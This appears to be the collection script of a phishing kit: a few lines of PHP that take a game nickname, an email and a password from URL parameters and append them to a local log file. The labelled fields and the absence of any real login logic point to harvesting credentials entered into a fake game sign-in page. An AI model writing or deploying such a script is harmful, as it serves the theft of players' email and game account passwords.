<?php
$nik = $_GET['nik'];
$pas1s = $_GET['pass1'];
$pas2s = $_GET['pass2'];
$f = fopen("log.txt", "a+");
fwrite($f,"\rGame: $nik 
Email: $pas1s  Password: $pas2s \n");
fclose($f);
?>
